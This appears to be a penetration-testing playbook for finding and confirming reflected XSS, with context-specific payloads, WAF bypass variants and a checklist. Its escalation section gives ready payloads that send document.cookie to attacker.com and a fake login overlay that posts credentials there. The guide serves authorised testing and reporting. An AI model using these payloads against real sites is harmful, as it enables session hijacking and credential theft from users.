# Scenario: Reflected XSS Testing Workflow

## Overview
A systematic workflow for finding and confirming reflected XSS vulnerabilities. This covers: identifying injection points, determining the rendering context, selecting appropriate payloads, bypassing filters, and escalating impact.

## When This Happens
- Any parameter, form field, URL path, header, or cookie value is reflected in the HTML response.
- The application renders user input without proper encoding or sanitization.
- Error pages, search results, or confirmation messages display URL parameters.

## Recon / Detection

### Step 1: Find reflection points
Inject a unique canary string in every parameter and input:
```
waerxss123
```
Search the response body for this string. Note **every** location where it appears and the surrounding HTML context.

### Step 2: Characterize the context
Where does your input land?

| If you see... | Context | Next step |
|--------------|---------|-----------|
| `<p>waerxss123</p>` | HTML body | Try injecting tags |
| `<input value="waerxss123">` | Attribute | Close the attribute, inject event |
| `var x = "waerxss123"` | JavaScript | Close the string, inject code |
| `<a href="waerxss123">` | URL/href | Try `javascript:` protocol |

### Step 3: Test character handling
Check which characters are allowed/blocked:
```
< > " ' / ( ) ` = ; { }
```
Submit each character individually and observe if it is:
- **Reflected as-is** → exploitable
- **HTML-encoded** (`&lt;` etc.) → need a different context
- **Stripped** → try encoding or alternative characters
- **Blocked** (WAF response) → need bypass techniques

## Exploitation Steps

### Stage 1: Proof of concept (per context)

**HTML body:**
```html
<img src=x onerror=alert(document.domain)>
```

**Inside attribute:**
```html
" autofocus onfocus=alert(document.domain) x="
```

**Inside JavaScript:**
```
';alert(document.domain);//
```

**Inside href:**
```
javascript:alert(document.domain)
```

### Stage 2: WAF/filter bypass (if basic payloads are blocked)

Try in order:
1. **Case variation**: `<ImG sRc=x oNeRrOr=alert(1)>`
2. **Alternative tags**: `<svg onload=alert(1)>`, `<details open ontoggle=alert(1)>`
3. **Event handler substitutes**: `onpointerover`, `onbeforetoggle`, `onfocusin`
4. **Encoding**: HTML entities, URL encoding, Unicode escapes
5. **Tag injection via template escape**: `</script><script>alert(1)</script>`
6. **Popover-based (modern)**: `<button popovertarget=x>Click<input popover id=x onbeforetoggle=alert(1)>`

### Stage 3: Impact escalation
Don't just demonstrate `alert(1)` — show real impact:

**Cookie theft:**
```html
<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">
```

**Session hijacking:**
```html
<script>location='https://attacker.com/steal?'+document.cookie</script>
```

**Phishing overlay:**
```html
<script>document.body.innerHTML='<h1>Session Expired</h1><form action=https://attacker.com/phish><input name=user placeholder=Email><input name=pass type=password><button>Login</button></form>'</script>
```

## Testing Checklist

| Step | Action | Status |
|------|--------|--------|
| 1 | Inject canary in all parameters | |
| 2 | Map all reflection points | |
| 3 | Identify context for each reflection | |
| 4 | Test character filtering | |
| 5 | Attempt basic PoC payload | |
| 6 | Apply bypass techniques if blocked | |
| 7 | Confirm execution in browser | |
| 8 | Escalate to cookie theft or phishing PoC | |
| 9 | Document with screenshot and full request | |

## Tools
- **Burp Suite**: Repeater for payload testing, Intruder for fuzzing.
- **dalfox**: Automated XSS parameter analysis.
- **Browser DevTools**: Confirm execution, inspect DOM.
- **XSS Hunter**: Blind XSS detection.
- **Hackvertor (Burp)**: Encoding/obfuscation helper.

## Real-World Notes
- **Context is king** — the same payload works in one context and fails in another.
- On large targets, focus on: subdomain expansion, historical parameters (Wayback), JS source analysis, OAuth redirect parameters, and error pages.
- Stored XSS in profile fields, comments, and file uploads is higher impact than reflected.
- Always capture the full HTTP request and response in your report.

## References
- `techniques/xss-techniques.md`
- `techniques/web-cache-poisoning.md` (XSS → cache poison escalation)
- `techniques/cors-misconfigurations.md` (XSS + CORS chain)
- `methodology/web-recon-methodology.md`
